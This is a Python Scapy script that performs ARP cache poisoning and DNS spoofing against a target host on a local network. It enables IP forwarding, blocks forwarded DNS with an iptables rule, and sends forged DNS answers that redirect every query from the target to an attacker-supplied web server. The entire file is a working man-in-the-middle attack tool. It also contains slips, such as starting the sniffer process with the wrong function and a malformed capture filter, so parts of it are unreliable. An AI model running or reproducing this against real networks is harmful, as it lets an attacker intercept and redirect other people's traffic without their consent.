from scapy.all import DNS, DNSQR, IP, send, IPv6, sr, UDP, sniff, DNSRR, sendp, Ether, srp1, ARP
from subprocess import Popen, PIPE, call
import threading
import random
import argparse
import sys
import os
import platform
import time
from multiprocessing import Process

DNS_FILTER = "udp port 53"
SPOOFED_SITE = [b'www.resonous.com.']	#192.168.1.5

g_target_ip = ""
g_router_ip = ""
g_server_ip = ""

def dns_sniffer():
	global g_target_ip
	sniff(filter="udp port 53 and host" + g_target_ip, prn=dns_spoofer)

def dns_spoofer(pkt):
	global g_target_ip, g_router_ip, g_server_ip

	if (pkt[IP].src == g_target_ip and
		pkt.haslayer(DNS) and
		pkt[DNS].qr == 0 and				# DNS Query
		pkt[DNS].opcode == 0 and			# DNS Standard Query
		pkt[DNS].ancount == 0				# Answer Count
		#pkt[DNS].qd.qname in SPOOFED_SITE	# Query domain name
		):

		print("Sending spoofed DNS response")

		if (pkt.haslayer(IPv6)):
			ip_layer = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
		else:
			ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)


		# Create the spoofed DNS response (returning back our IP as answer instead of the endpoint)
		dns_resp =  ip_layer/ \
					UDP(
						dport=pkt[UDP].sport,
						sport=53
						)/ \
					DNS(
						id=pkt[DNS].id,					# Same as query
						ancount=1,						# Number of answers
						qr=1,							# DNS Response
						ra=1,							# Recursion available
						qd=(pkt.getlayer(DNS)).qd,		# Query Data
						an=DNSRR(
							rrname=pkt[DNSQR].qname,	# Queried host name
							rdata=g_server_ip,	# IP address of queried host name
							ttl = 10
							)
						)

		# Send the spoofed DNS response
		print(dns_resp.show())
		send(dns_resp, verbose=0)
		print(f"Resolved DNS request for {pkt[DNS].qd.qname} by {g_server_ip}")


def get_mac(ip):
	arp = Ether()/ARP(pdst=ip)
	resp = srp1(arp)
	return (resp[Ether].src)

"""
	Enables IP forwarding and disables DNS forwarding
"""
def forwarding():
	# Check to see if script is running on linux
	if (platform.system() == "Linux"):
		# Enable IP forwarding
		ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
		ipf_read = ipf.read()
		if (ipf_read != '1\n'):
			ipf.write('1\n')
		ipf.close()

		# Disable DNS Query forwarding
		firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
		Popen([firewall], shell=True, stdout=PIPE)

	# first complete linux
	if (platform.system() == "Windows"):
		sys.exit("Please enable IP forwarding")

def poison_arp_cache(target_mac, router_mac):
	global g_target_ip, g_router_ip
	while True:
		# Poison router's cache (Scapy will automatically fill in the ethernet frame with our MAC)
		send(ARP(op=2, psrc=g_target_ip, pdst=g_router_ip, hwdst=router_mac))

		# Poison target's cache
		send(ARP(op=2, psrc=g_router_ip, pdst=g_target_ip, hwdst=target_mac))

		# Sleep to prevent flooding
		time.sleep(2)


def main():
	global g_target_ip, g_router_ip, g_server_ip

	# Get the args
	parser = argparse.ArgumentParser()
	parser.add_argument("-r", help="Specify the router's IP")
	parser.add_argument("-t", help="Specify the target's IP")
	parser.add_argument("-s", help="Specify the attacker's webserver's IP")
	args = parser.parse_args()

	g_target_ip = args.t
	g_router_ip = args.r
	g_server_ip = args.s

	# Get the mac address
	target_mac = get_mac(g_target_ip)
	router_mac = get_mac(g_router_ip)
	our_mac	= Ether().src

	# Check to see if we got the MAC address
	if (router_mac == None):
		sys.exit("Couldnt get router's MAC address. exiting")
	if (target_mac == None):
		sys.exit("Couldnt get target's MAC address. exiting")
	if (our_mac == None):
		sys.exit("Couldnt get our MAC address. exiting")

	print("[*] Router MAC: ", router_mac)
	print("[*] Target MAC: ", target_mac)

	forwarding()

	# Create ARP poisoner
	process_arp_poisoner = Process(target=poison_arp_cache,args=(target_mac, router_mac))
	process_arp_poisoner.start()

	# Create DNS sniffer
	process_dns_sniffer = Process(target=dns_spoofer)
	process_dns_sniffer.start()

	# Wait either for process to complete or user to exit
	process_arp_poisoner.join()
	process_dns_sniffer.join()

if __name__ == "__main__":
	main()
